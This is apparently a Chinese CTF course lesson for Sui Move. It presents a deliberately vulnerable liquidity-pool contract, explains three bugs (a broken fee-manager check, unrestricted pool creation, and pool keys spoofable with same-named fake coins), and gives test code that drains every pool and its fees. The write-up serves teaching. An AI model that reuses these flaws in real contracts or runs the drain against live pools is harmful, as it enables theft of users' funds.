# 实践：多步骤综合挑战

## 题目描述

在本次Sui Move CTF课程的最后，你将结合前面学习到的内容尝试破解一个综合多个漏洞的CTF题目。你面对一个 Sui Move 实现的流动性池合约，合约允许用户在两组代币对之间进行兑换（swap），并收取一定手续费。你的目标是通过分析合约逻辑，结合前面学习到的漏洞，利用合约提供的swap函数，最终让合约中所有代币余额与累计手续费之和为零（即所有资产被偷走），从而通过 `is_solved` 函数获得 flag。flag 会以事件形式输出，格式为 CTF{xxx}。

## 示例代码

以下是本次CTF task8题目的代码：

``` move

module task8::token1 {
    use sui::coin;
    public struct TOKEN1 has drop {}

    fun init(witness: TOKEN1, ctx: &mut TxContext) {
        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token1", b"", b"", option::none(), ctx);
        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
        transfer::public_freeze_object(coin_metadata);
    }

}

module task8::token2 {
    use sui::coin;
    public struct TOKEN2 has drop {}

    fun init(witness: TOKEN2, ctx: &mut TxContext) {
        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token2", b"", b"", option::none(), ctx);
        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
        transfer::public_freeze_object(coin_metadata);
    }

}

module task8::token3 {
    use sui::coin;
    public struct TOKEN3 has drop {}

    fun init(witness: TOKEN3, ctx: &mut TxContext) {
        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token3", b"", b"", option::none(), ctx);
        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
        transfer::public_freeze_object(coin_metadata);
    }

}

module task8::token4 {
    use sui::coin;
    public struct TOKEN4 has drop {}

    fun init(witness: TOKEN4, ctx: &mut TxContext) {
        let (mut treasury_cap, coin_metadata) = coin::create_currency(witness, 6, b"Token4", b"", b"", option::none(), ctx);
        transfer::public_transfer(treasury_cap, tx_context::sender(ctx));
        transfer::public_freeze_object(coin_metadata);
    }

}

module task8::pool {
    use sui::coin::{Self, Coin};
    use task8::token1::{TOKEN1};
    use task8::token2::{TOKEN2};
    use task8::token3::{TOKEN3};
    use task8::token4::{TOKEN4};

    use sui::bag::{Self, Bag};
    use std::type_name::{Self, TypeName};
    use std::ascii::String;
    use std::ascii::{Self};


    use sui::balance::{Self, Balance};
    use sui::event;

    public struct AdminCap has key { id: UID }

    public struct Pools has key, store {
        id: UID,
        balance_bag: Bag,
        pool_bag: Bag,       
        fee_manager: address,
        cap_bag: Bag,
        free_mint: bool, 
    }

    public struct Pool has store, drop {
        token_1: TypeName,
        token_2: TypeName,
        reserve_1: u64,
        reserve_2: u64,
        fee: u64,
        fee_amount_1: u64,
        fee_amount_2: u64,
    }

    public struct PoolCap<phantom X, phantom Y> has key, store { 
        id: UID,
    }

    public struct Flag has copy, drop {
        user: address,
    }

    // init for admin
    fun init(ctx: &mut TxContext) {
        transfer::transfer(AdminCap {
            id: object::new(ctx)
        }, tx_context::sender(ctx));

        transfer::share_object(Pools {
            id: object::new(ctx),
            balance_bag: bag::new(ctx),
            pool_bag: bag::new(ctx),
            fee_manager: tx_context::sender(ctx),
            cap_bag: bag::new(ctx),
            free_mint: false
        });
    }

    public fun get_token<T>(pools: &mut Pools): &mut Balance<T> {
        let type_name = type_name::into_string(type_name::get<T>());
        if (!pools.balance_bag.contains(type_name)) {
            pools.balance_bag.add(type_name, balance::zero<T>());
        };
        &mut pools.balance_bag[type_name]
    }

    fun get_balance<T>(pools: &mut Pools): u64 {
        balance::value<T>(get_token(pools))
    }
    
    fun get_total_fee<X, Y>(pools: &mut Pools): u64 {
        get_pool<X, Y>(pools).fee_amount_1 + get_pool<X, Y>(pools).fee_amount_2
    }


    fun get_fee<X, Y>(pools: &mut Pools): u64 {
        get_pool<X, Y>(pools).fee
    }

    fun get_struct<X>(): String {
        let type_name = type_name::get<X>();
        let address_part = type_name.get_address().length();
        let module_part = type_name.get_module().length();
        let full = type_name.borrow_string().length();
        type_name.borrow_string().substring(address_part + module_part + 4, full)
    }

    fun get_pool_k<X, Y>(): String {
        let mut pool_k = get_struct<X>();
        ascii::append(&mut pool_k, get_struct<Y>());
        pool_k
    }

    public fun get_pool<X, Y>(pools: &mut Pools): &mut Pool {
        let pool = pools.pool_bag.borrow_mut<String, Pool>(
            get_pool_k<X, Y>(),
        );
        pool
    }


    ///////// admin functions
    public entry fun set_fee_manager(pools: &mut Pools, new_fee_manager: address, ctx: &mut TxContext) {
        assert!(tx_context::sender(ctx) == new_fee_manager, 0);
        pools.fee_manager = new_fee_manager;
    }

    public fun create_pool<X, Y>(pools: &mut Pools, fee: u64, token1: Coin<X>, token2: Coin<Y>, ctx: &mut TxContext): PoolCap<X, Y> {
        let add1 = token1.value();
        let add2 = token2.value();
        balance::join(get_token<X>(pools), coin::into_balance(token1));
        balance::join(get_token<Y>(pools), coin::into_balance(token2));

        let pool = Pool {
            token_1: type_name::get<X>(),
            token_2: type_name::get<Y>(),
            reserve_1: add1,
            reserve_2: add2,

            fee,
            fee_amount_1: 0,
            fee_amount_2: 0,
        };
        if (!pools.pool_bag.contains(get_pool_k<X, Y>())) {
        pools.pool_bag.add(
            get_pool_k<X, Y>(),
            pool
        );
        };

        PoolCap<X, Y> {
            id: object::new(ctx)
        }
    }

    public fun claim_fees<X, Y>(pools: &mut Pools, _pool_cap: &mut PoolCap<X, Y>, ctx: &mut TxContext): (Coin<X>, Coin<Y>) {
        assert!(tx_context::sender(ctx) == pools.fee_manager, 0);
        let fee_1 = if (get_pool<X, Y>(pools).fee_amount_1 > get_balance<X>(pools)) {
            get_balance<X>(pools)

        } else {
            get_pool<X, Y>(pools).fee_amount_1
        };
        let fee_2 = if (get_pool<X, Y>(pools).fee_amount_2 > get_balance<Y>(pools)) {
            get_balance<Y>(pools)

        } else {
            get_pool<X, Y>(pools).fee_amount_2
        };
        get_pool<X, Y>(pools).fee_amount_1 = 0;
        get_pool<X, Y>(pools).fee_amount_2 = 0;
        (
            coin::from_balance(balance::split(get_token<X>(pools), fee_1), ctx),
            coin::from_balance(balance::split(get_token<Y>(pools), fee_2), ctx)
        )

    }

    public entry fun init_pools(_cap: &mut AdminCap, pools: &mut Pools, token1: Coin<TOKEN1>, token2: Coin<TOKEN2>, token3: Coin<TOKEN3>, token4: Coin<TOKEN4>, ctx: &mut TxContext) {
        let cap1 = create_pool<TOKEN1, TOKEN2>(pools, 2, token1, token2, ctx);
        let cap2 = create_pool<TOKEN3, TOKEN4>(pools, 2, token3, token4, ctx);
        pools.cap_bag.add(
            get_pool_k<TOKEN1, TOKEN2>(),
            cap1
        );
        pools.cap_bag.add(
            get_pool_k<TOKEN3, TOKEN4>(),
            cap2
        );
    }

    ///////// public functions
    public fun get_amount_out<X, Y>(pools: &mut Pools, amount_in: u64, order: bool): (u64, u64) {
        let pool = get_pool<X, Y>(pools);

        let (reserve_in, reserve_out)  = 
            if (order) {
                (pool.reserve_1, pool.reserve_2)
            } else {
                (pool.reserve_2, pool.reserve_1)
            };

        let fees_amount = amount_in * get_fee<X, Y>(pools) / 100;
        let amount_in = amount_in - fees_amount;
        let amount_out = amount_in * reserve_out / (reserve_in + amount_in);
        (amount_out, fees_amount)
    }

    public fun swap_a_2_b<X, Y>(
        pools: &mut Pools, from: &mut Coin<X>, ctx: &mut TxContext): Coin<Y> {
        let amount_in = from.value();
        let (mut amount_out, fee) = get_amount_out<X, Y>(
            pools,
            amount_in,
            true,
        );
        if (amount_out > get_pool<X, Y>(pools).reserve_2) {
            amount_out = get_pool<X, Y>(pools).reserve_2;
        };

        if (amount_out > get_balance<Y>(pools)) {
            amount_out = get_balance<Y>(pools)
        };

        let store = get_token<X>(pools);
        balance::join(store, coin::into_balance(
            coin::split(from, amount_in, ctx)
        ));
        get_pool<X, Y>(pools).fee_amount_1 = get_pool<X, Y>(pools).fee_amount_1 + fee;
        get_pool<X, Y>(pools).reserve_1 = get_pool<X, Y>(pools).reserve_1 + amount_in - fee;
        get_pool<X, Y>(pools).reserve_2 = get_pool<X, Y>(pools).reserve_2 - amount_out;

        coin::from_balance(balance::split(get_token<Y>(pools), amount_out), ctx)
    }

    public fun swap_b_2_a<X, Y>(
        pools: &mut Pools, from: &mut Coin<Y>, ctx: &mut TxContext): Coin<X> {
        let amount_in = from.value();
        let (mut amount_out, fee) = get_amount_out<X, Y>(
            pools,
            amount_in,
            false
        ); 

        if (amount_out > get_pool<X, Y>(pools).reserve_2) {
            amount_out = get_pool<X, Y>(pools).reserve_2;
        };

        if (amount_out > get_balance<X>(pools)) {
            amount_out = get_balance<X>(pools)
        };

        let store = get_token<Y>(pools);
        balance::join(store, coin::into_balance(
            coin::split(from, amount_in, ctx)
        ));

        get_pool<X, Y>(pools).fee_amount_2 = get_pool<X, Y>(pools).fee_amount_2 + fee;
        get_pool<X, Y>(pools).reserve_2 = get_pool<X, Y>(pools).reserve_2 + amount_in - fee;
        get_pool<X, Y>(pools).reserve_1 = get_pool<X, Y>(pools).reserve_1 - amount_out;


        coin::from_balance(balance::split(get_token<X>(pools), amount_out), ctx)
    }

    // check whether you can get the flag
    public entry fun is_solved(pools: &mut Pools, ctx: &mut TxContext) {
        let sum = get_balance<TOKEN1>(pools) + get_balance<TOKEN2>(pools) + get_balance<TOKEN3>(pools) + get_balance<TOKEN4>(pools);
        let fee_sum = get_total_fee<TOKEN1, TOKEN2>(pools) + get_total_fee<TOKEN3, TOKEN4>(pools);
        assert!(sum + fee_sum == 0, 0);
        event::emit(Flag { user: tx_context::sender(ctx) })
    }


    #[test_only]
    public fun init_for_testing(ctx: &mut TxContext) {
        init(ctx); 
    }

}

```

## 任务目标
理解代码，找到代码中隐藏的多个漏洞，构造攻击链，耗尽pool中的所有代币与手续费。
``` move
    public entry fun is_solved(pools: &mut Pools, ctx: &mut TxContext) {
        let sum = get_balance<TOKEN1>(pools) + get_balance<TOKEN2>(pools) + get_balance<TOKEN3>(pools) + get_balance<TOKEN4>(pools);
        let fee_sum = get_total_fee<TOKEN1, TOKEN2>(pools) + get_total_fee<TOKEN3, TOKEN4>(pools);
        assert!(sum + fee_sum == 0, 0);
        event::emit(Flag { user: tx_context::sender(ctx) })
    }
```

## 题目中的漏洞

### 漏洞1. 权限控制漏洞
设置费用管理者存在权限漏洞，函数中检查了`new_fee_manager`是否是`tx_context::sender`，正确的应该是检查`pools.fee_manager`是否是`pools.fee_manager`，这里的权限检查漏洞可以让我们直接成为pools费用管理者。
```
    ///////// admin functions
    public entry fun set_fee_manager(pools: &mut Pools, new_fee_manager: address, ctx: &mut TxContext) {
        assert!(tx_context::sender(ctx) == new_fee_manager, 0);
        pools.fee_manager = new_fee_manager;
    }
```

### 漏洞2. 权限检查绕过
`create_pool`函数没有权限控制，且没有对创建的pool进行重复性检查，意味着我们可以重复创建pool，拿到对应的X，Y pool的`PoolCap`。

``` move
    public fun create_pool<X, Y>(pools: &mut Pools, fee: u64, token1: Coin<X>, token2: Coin<Y>, ctx: &mut TxContext): PoolCap<X, Y> {
        let add1 = token1.value();
        let add2 = token2.value();
        balance::join(get_token<X>(pools), coin::into_balance(token1));
        balance::join(get_token<Y>(pools), coin::into_balance(token2));

        let pool = Pool {
            token_1: type_name::get<X>(),
            token_2: type_name::get<Y>(),
            reserve_1: add1,
            reserve_2: add2,

            fee,
            fee_amount_1: 0,
            fee_amount_2: 0,
        };
        if (!pools.pool_bag.contains(get_pool_k<X, Y>())) {
        pools.pool_bag.add(
            get_pool_k<X, Y>(),
            pool
        );
        };

        PoolCap<X, Y> {
            id: object::new(ctx)
        }
    }
```
## 漏洞3. 创建池期间使用的种子并不唯一
合约中存储的pool key是根据X coin和Y coin的结构体名来生成，这意味着这里生成的种子并不唯一，可以通过使用同名的X coin 和Y coin，也就是伪造的coin来攻击

``` move
    fun get_struct<X>(): String {
        let type_name = type_name::get<X>();
        let address_part = type_name.get_address().length();
        let module_part = type_name.get_module().length();
        let full = type_name.borrow_string().length();
        type_name.borrow_string().substring(address_part + module_part + 4, full)
    }

    fun get_pool_k<X, Y>(): String {
        let mut pool_k = get_struct<X>();
        ascii::append(&mut pool_k, get_struct<Y>());
        pool_k
    }

    public fun get_pool<X, Y>(pools: &mut Pools): &mut Pool {
        let pool = pools.pool_bag.borrow_mut<String, Pool>(
            get_pool_k<X, Y>(),
        );
        pool
    }
```

## 攻击链构造
我们的目的是掏空pool的所有资金和手续费，我们可以通过漏洞1和漏洞2成为协议的费用管理者并且拿到`poolcap`，就能够提取协议的手续费。通过漏洞3可以通过伪造的Coin把协议的资金掏空。
``` move
    public fun claim_fees<X, Y>(pools: &mut Pools, _pool_cap: &mut PoolCap<X, Y>, ctx: &mut TxContext): (Coin<X>, Coin<Y>) {
        assert!(tx_context::sender(ctx) == pools.fee_manager, 0);
        let fee_1 = if (get_pool<X, Y>(pools).fee_amount_1 > get_balance<X>(pools)) {
            get_balance<X>(pools)

        } else {
            get_pool<X, Y>(pools).fee_amount_1
        };
        let fee_2 = if (get_pool<X, Y>(pools).fee_amount_2 > get_balance<Y>(pools)) {
            get_balance<Y>(pools)

        } else {
            get_pool<X, Y>(pools).fee_amount_2
        };
        get_pool<X, Y>(pools).fee_amount_1 = 0;
        get_pool<X, Y>(pools).fee_amount_2 = 0;
        (
            coin::from_balance(balance::split(get_token<X>(pools), fee_1), ctx),
            coin::from_balance(balance::split(get_token<Y>(pools), fee_2), ctx)
        )

    }
```
## 题解
具体的解题步骤如下：我们创建了假的`TOKEN1`，`TOKEN2`，`TOKEN3`，`TOKEN4`，然后调用`swap_b_2_a`和`swap_a_2_b`函数来耗尽pool（漏洞3），调用`set_fee_manager`函数将自己设置为`fee_manager`（漏洞1）,通过调用`create_pool`函数拿到`poolcap`（漏洞2），提取协议费用，最终拿到了flag。
``` move
        // ////////////// user 
        let user = @0x1235;
        test_scenario::next_tx(scenario, user);
        {
            let mut pools = test_scenario::take_shared<Pools>(scenario);
            
            let mut in = mint_for_testing<TOKEN2>(8000, test_scenario::ctx(scenario));
            let out = swap_b_2_a<T_TOKEN1, TOKEN2>(&mut pools, &mut in, test_scenario::ctx(scenario));

            transfer::public_transfer(out, user);
            transfer::public_transfer(in, user);
   
            let mut in = mint_for_testing<TOKEN1>(8000, test_scenario::ctx(scenario));
            let out = swap_a_2_b<TOKEN1, T_TOKEN2>(&mut pools, &mut in, test_scenario::ctx(scenario));
            transfer::public_transfer(out, user);
            transfer::public_transfer(in, user);

            set_fee_manager(&mut pools, user, test_scenario::ctx(scenario));
            let mut cap = create_pool<T_TOKEN1, T_TOKEN2>(&mut pools, 0, coin::zero<T_TOKEN1>(test_scenario::ctx(scenario)), coin::zero<T_TOKEN2>(test_scenario::ctx(scenario)), test_scenario::ctx(scenario));
            let (x, y) = claim_fees<T_TOKEN1, T_TOKEN2>(&mut pools, &mut cap, test_scenario::ctx(scenario));
            transfer::public_transfer(x, user);
            transfer::public_transfer(y, user);
            transfer::public_transfer(cap, user);

            test_scenario::return_shared(pools);
        };

        test_scenario::next_tx(scenario, user);
        {
            let mut pools = test_scenario::take_shared<Pools>(scenario);
            let mut in = mint_for_testing<TOKEN4>(8000, test_scenario::ctx(scenario));
            let out = swap_b_2_a<T_TOKEN3, TOKEN4>(&mut pools, &mut in, test_scenario::ctx(scenario));
            transfer::public_transfer(out, user);
            transfer::public_transfer(in, user);
   
            let mut in = mint_for_testing<TOKEN3>(8000, test_scenario::ctx(scenario));
            let out = swap_a_2_b<TOKEN3, T_TOKEN4>(&mut pools, &mut in, test_scenario::ctx(scenario));
            transfer::public_transfer(out, user);
            transfer::public_transfer(in, user);

            set_fee_manager(&mut pools, user, test_scenario::ctx(scenario));
            let mut cap = create_pool<T_TOKEN3, T_TOKEN4>(&mut pools, 0, coin::zero<T_TOKEN3>(test_scenario::ctx(scenario)), coin::zero<T_TOKEN4>(test_scenario::ctx(scenario)), test_scenario::ctx(scenario));
            let (x, y) = claim_fees<T_TOKEN3, T_TOKEN4>(&mut pools, &mut cap, test_scenario::ctx(scenario));
            transfer::public_transfer(x, user);
            transfer::public_transfer(y, user);
            transfer::public_transfer(cap, user);


            test_scenario::return_shared(pools);
        };

        let user = @0x1235;
        test_scenario::next_tx(scenario, user);
        {
            let mut pools = test_scenario::take_shared<Pools>(scenario);
            is_solved(&mut pools, test_scenario::ctx(scenario));
            test_scenario::return_shared(pools);
        };

        test_scenario::end(scenario_val);
```